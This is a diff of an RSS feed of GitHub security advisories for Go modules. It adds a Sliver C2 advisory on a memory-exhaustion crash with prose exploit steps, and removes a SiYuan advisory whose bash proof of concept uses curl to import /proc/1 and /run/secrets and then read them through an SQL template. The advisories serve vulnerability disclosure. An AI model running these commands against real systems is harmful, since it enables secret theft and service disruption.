@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-17T17:20:07.717Z</updated>
+    <updated>2026-03-17T18:14:11.475Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,74 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/bishopfox/sliver] Sliver Vulnerable to Authenticated OOM via Memory Exhaustion in mTLS/WireGuard Transports]]></title>
+        <id>https://github.com/advisories/GHSA-97vp-pwqj-46qc</id>
+        <link href="https://github.com/advisories/GHSA-97vp-pwqj-46qc"/>
+        <updated>2026-03-17T17:48:47.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
+<p>A Remote OOM (Out-of-Memory) vulnerability exists in the Sliver C2 server's mTLS and WireGuard C2 transport layer. The&nbsp;<code>socketReadEnvelope</code>&nbsp;and <code>socketWGReadEnvelope</code>&nbsp;functions trust an attacker-controlled 4-byte length prefix to allocate memory, with&nbsp;<code>ServerMaxMessageSize</code>&nbsp;allowing single allocations of up to&nbsp;<strong>~2 GiB</strong>. A compromised implant or an attacker with valid credentials can exploit this by sending fabricated length prefixes over concurrent yamux streams (up to 128 per connection), forcing the server to attempt allocating&nbsp;<strong>~256 GiB</strong>&nbsp;of memory and triggering an OS OOM kill. This crashes the Sliver server, disrupts all active implant sessions, and may degrade or kill other processes sharing the same host. The same pattern also affects all implant-side readers, which have&nbsp;<strong>no</strong>&nbsp;upper-bound check at all.</p>
+<hr>
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>The C2 envelope framing protocol uses a 4-byte little-endian length prefix to delimit protobuf messages on the wire:</p>
+<pre><code>[raw_signature (74 bytes)] [uint32 length] [protobuf data]
+</code></pre>
+<p>In <a href="https://github.com/BishopFox/sliver/blob/master/server/c2/mtls.go#L337-L392">socketReadEnvelope</a>, after reading the length prefix, the server immediately allocates a buffer of the attacker-specified size:</p>
+<pre><code class="language-go">// server/c2/mtls.go
+const ServerMaxMessageSize = (2 * 1024 * 1024 * 1024) - 1  // ~2 GiB
+
+dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
+if dataLength &lt;= 0 || ServerMaxMessageSize &lt; dataLength {
+    return nil, errors.New("[pivot] invalid data length")
+}
+dataBuf := make([]byte, dataLength)  // ← Allocates up to ~2 GiB
+
+// ... data is read into buffer ...
+
+// Envelope signature verification happens AFTER allocation and read:
+if !ed25519.Verify(pubKey, dataBuf, signature) {
+    return nil, errors.New("[mtls] invalid signature")
+}
+</code></pre>
+<p><strong>Key issues:</strong></p>
+<ol>
+<li><strong>Excessive limit</strong>: <code>ServerMaxMessageSize</code> is set to <code>(2 * 1024 * 1024 * 1024) - 1</code> ≈ <strong>2 GiB</strong>, far exceeding any legitimate protobuf envelope (large payloads like screenshots and downloads are chunked at the RPC layer).</li>
+<li><strong>Allocation before envelope verification</strong>: While the TLS handshake validates the client certificate, the per-envelope ed25519 signature check (<code>ed25519.Verify</code>) occurs <strong>after</strong> the buffer allocation and <code>io.ReadFull</code>. Once the TLS connection is established, no further cryptographic proof is needed to trigger the allocation.</li>
+<li><strong>Yamux amplification</strong>: The yamux session allows up to <code>mtlsYamuxMaxConcurrentStreams = 128</code> concurrent streams. Each stream processes <code>socketReadEnvelope</code> independently, so a single connection can trigger <strong>128 parallel ~2 GiB allocations</strong>.</li>
+<li><strong>Implant-side exposure</strong>: The implant-side readers (<a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/mtls/mtls.go#L184">ReadEnvelope</a> in mTLS/WireGuard, <a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/pivots/pivots.go#L478">read()</a> in pivots) have <strong>no upper-bound check at all</strong> — they accept any <code>dataLength &gt; 0</code>.</li>
+</ol>
+<p>The same pattern exists in <a href="https://github.com/BishopFox/sliver/blob/master/server/c2/wireguard.go#L428-L487">socketWGReadEnvelope</a> for the WireGuard transport.</p>
+<p><em>Note: The same unbounded allocation pattern is also present in implant-side readers, though it poses no immediate risk to the server <a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/mtls/mtls.go#L185">1</a>, <a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/wireguard/wireguard.go#L178">2</a>, <a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/pivots/pivots.go">3</a>, <a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/pivotclients/pivotclient.go">4</a>.</em></p>
+<hr>
+<h1 id="proof-of-concept">Proof of Concept</h1>
+<p>PoC Links: <a href="https://github.com/skoveit/Sliver-OOM-DoS-PoC/">mtls_poc.go</a> or <a href="https://gist.github.com/skoveit/08f3ec08ffbf3deeff189a83ef827dcf">Gist Version</a></p>
+<ol>
+<li><strong>Establish mTLS connection</strong>: Complete a valid TLS 1.3 handshake presenting a valid implant client certificate.</li>
+<li><strong>Negotiate yamux</strong>: Send the <code>MUX/1</code> preface to enter multiplexed stream mode.</li>
+<li><strong>Open concurrent streams</strong>: Open multiple yamux streams (up to 128).</li>
+<li><strong>Send malicious length prefix</strong>: On each stream, send a 74-byte raw signature buffer followed by a 4-byte length prefix claiming <code>0x7FFFFFFF</code> (2,147,483,647 bytes ≈ 2 GiB). No actual data needs to follow.</li>
+<li><strong>Result</strong>: Each stream triggers a <code>make([]byte, 0x7FFFFFFF)</code> allocation. With 128 concurrent streams, the server process attempts to allocate <strong>up to ~256 GiB</strong> of memory, causing the OS OOM killer to terminate the process.</li>
+</ol>
+<h1 id="impact">Impact</h1>
+<ul>
+<li><strong>Server availability</strong>: The Sliver server process is killed. Active implant sessions are disrupted until the operator manually restarts the server.</li>
+<li><strong>Host degradation</strong>: On hosts with swap enabled, the OOM event may cause swap thrashing and degrade other services sharing the same host before the process is killed.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/BishopFox/sliver/security/advisories/GHSA-97vp-pwqj-46qc">https://github.com/BishopFox/sliver/security/advisories/GHSA-97vp-pwqj-46qc</a></li>
+<li><a href="https://gist.github.com/skoveit/08f3ec08ffbf3deeff189a83ef827dcf">https://gist.github.com/skoveit/08f3ec08ffbf3deeff189a83ef827dcf</a></li>
+<li><a href="https://github.com/advisories/GHSA-97vp-pwqj-46qc">https://github.com/advisories/GHSA-97vp-pwqj-46qc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-97vp-pwqj-46qc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-17T17:48:45.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/cloudnativelabs/kube-router/v2] Kube-router Proxy Module Blindly Trusts ExternalIPs/LoadBalancer IPs Enabling Cluster-Wide Traffic Hijacking and DNS DoS]]></title>
         <id>https://github.com/advisories/GHSA-phqm-jgc3-qf8g</id>
@@ -1691,84 +1759,5 @@ this.element.querySelector(`[data-url="${data.data.box}"] .b3-list-item__text`).
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-16T18:47:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan] SiYuan importStdMd: unvalidated localPath imports arbitrary host directories as persistent notes]]></title>
-        <id>https://github.com/advisories/GHSA-rjhh-m223-9qqv</id>
-        <link href="https://github.com/advisories/GHSA-rjhh-m223-9qqv"/>
-        <updated>2026-03-16T18:47:26.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>POST /api/import/importStdMd</code> passes the <code>localPath</code> parameter directly to <code>model.ImportFromLocalPath</code> with <strong>zero path validation</strong>. The function recursively reads every file under the given path and permanently stores their content as SiYuan note documents in the workspace database, making them searchable and accessible to all workspace users.</p>
-<h3 id="details">Details</h3>
-<p><strong>File:</strong> <code>kernel/api/import.go</code> - function <code>importStdMd</code></p>
-<pre><code class="language-go">func importStdMd(c *gin.Context) {
-    notebook  := arg["notebook"].(string)
-    localPath := arg["localPath"].(string)   // no validation whatsoever
-    toPath    := arg["toPath"].(string)
-
-    err := model.ImportFromLocalPath(notebook, localPath, toPath)
-    // ↑ calls filelock.Walk(localPath, ...) - reads entire directory tree
-    // and writes every file's content into workspace SQLite as note blocks
-}
-</code></pre>
-<p><strong><code>model.ImportFromLocalPath</code></strong> (<code>kernel/model/import.go:784</code>):</p>
-<pre><code class="language-go">func ImportFromLocalPath(boxID, localPath string, toPath string) (err error) {
-    // ...
-    filelock.Walk(localPath, func(currentPath string, d fs.DirEntry, ...) error {
-        // reads file content → converts to .sy note → stores in database
-    })
-}
-</code></pre>
-<p>Unlike <code>globalCopyFiles</code>, there is <strong>no blocklist at all</strong>. Any readable path is accepted. The imported content is <strong>permanently stored</strong> in the workspace SQLite database and survives restarts.</p>
-<p><strong>Chained attack with Bug #1 (renderSprig):</strong>
-Admin imports sensitive files → content stored in <code>blocks</code> table → non-admin user queries via <code>querySQL</code> through <code>renderSprig</code>.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Environment:</strong></p>
-<pre><code class="language-bash">docker run -d --name siyuan -p 6806:6806 \
-  -v $(pwd)/workspace:/siyuan/workspace \
-  b3log/siyuan --workspace=/siyuan/workspace --accessAuthCode=test123
-</code></pre>
-<p><strong>Exploit:</strong></p>
-<pre><code class="language-bash">TOKEN="YOUR_ADMIN_TOKEN"
-
-# Step 1: Create a notebook to import into
-NOTEBOOK=$(curl -s -X POST http://localhost:6806/api/notebook/createNotebook \
-  -H "Authorization: Token $TOKEN" -H "Content-Type: application/json" \
-  -d '{"name":"Exfil"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['notebook']['id'])")
-
-# Step 2: Import /proc/1/ - stores cmdline, environ, maps as notes
-curl -s -X POST http://localhost:6806/api/import/importStdMd \
-  -H "Authorization: Token $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d "{\"notebook\":\"$NOTEBOOK\",\"localPath\":\"/proc/1\",\"toPath\":\"/\"}"
-
-# Step 3: Import Docker secrets (if present)
-curl -s -X POST http://localhost:6806/api/import/importStdMd \
-  -H "Authorization: Token $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d "{\"notebook\":\"$NOTEBOOK\",\"localPath\":\"/run/secrets\",\"toPath\":\"/\"}"
-
-# Step 4: Any authenticated user (non-admin) queries the imported secrets
-curl -s -X POST http://localhost:6806/api/template/renderSprig \
-  -H "Authorization: Token $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"template":"{{range $r := (querySQL \"SELECT content FROM blocks LIMIT 50\")}}{{$r.content}}\n---\n{{end}}"}'
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>An admin can permanently import the contents of any readable host directory into the workspace as searchable notes. Unlike <code>globalCopyFiles</code>, there is no blocklist - <code>/proc/</code>, <code>/etc/</code>, <code>/run/secrets/</code>, <code>/home/</code> are all accepted.</p>
-<p><strong>Data persists</strong> in the workspace database across restarts and is accessible to Publish Service Reader accounts. Combined with the <code>renderSprig</code> SQL injection (separate advisory), a non-admin user can then read all imported secrets without any additional privileges.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rjhh-m223-9qqv">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rjhh-m223-9qqv</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjhh-m223-9qqv">https://github.com/advisories/GHSA-rjhh-m223-9qqv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjhh-m223-9qqv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-16T18:47:22.000Z</published>
     </entry>
 </feed>
